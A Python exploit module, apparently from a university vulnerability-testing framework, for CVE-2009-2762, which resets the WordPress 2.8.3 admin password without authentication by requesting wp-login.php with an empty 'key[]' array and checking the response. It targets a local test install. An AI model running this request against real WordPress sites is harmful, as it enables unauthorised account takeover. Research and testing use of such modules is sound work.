
# Copyright 2013 University of Maryland.  All rights reserved.
# Use of this source code is governed by a BSD-style
# license that can be found in the LICENSE.TXT file.


import sys
import os
import time

from selenium.common.exceptions import NoSuchElementException
import framework

class Exploit (framework.Exploit):

    attributes = {'Name' :        "CVE_2009_2762",
                  'Description' : "Wordpress 2.8.3 and lower is vulnerable to remote password reset without authentication",
                  'References' :  [['http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2009-2762']], 
                  'Target' :      "Wordpress 2.8.3",
                  'TargetLicense' : '',
                  'VulWikiPage' : "N/A",
                  'Type' : 'CRED'
                  }

    def __init__(self, visible=False):
        framework.Exploit.__init__(self, visible)
        self.verified = False
        return
            

    def exploit(self):
        driver = self.create_selenium_driver(javascript=False)
        
        driver.get("http://127.0.0.1/wordpress/wp-login.php?action=rp&key[]=")
        
        try:
            element = driver.get_element(by_xpath="//p[text()[contains(.,'The e-mail could not be sent.')]]", delay=5)
            self.logger.info("Admin Password Reset. Exploit Successful.")
            self.verified = True
        except NoSuchElementException:
            self.logger.error("Failed to reset Admin password")

            
        if self.visible:
            time.sleep(10)

        driver.cleanup()
        return



    def verify(self):
        return self.verified
